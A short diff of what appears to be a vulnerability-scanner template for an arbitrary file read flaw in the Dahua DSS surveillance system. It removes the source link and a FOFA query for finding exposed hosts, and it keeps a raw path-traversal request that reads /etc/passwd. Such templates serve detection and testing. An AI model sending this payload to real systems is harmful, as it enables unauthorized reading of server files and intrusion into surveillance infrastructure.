@@ -3,12 +3,8 @@ info:
   name: 大华DSS数字监控系统attachment_downloadAtt.action任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lu8hz02fp9hnf9vh'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lu8hz02fp9hnf9vh
-    fofa: app="dahua-DSS"
 http:
 - raw:
   - 'GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
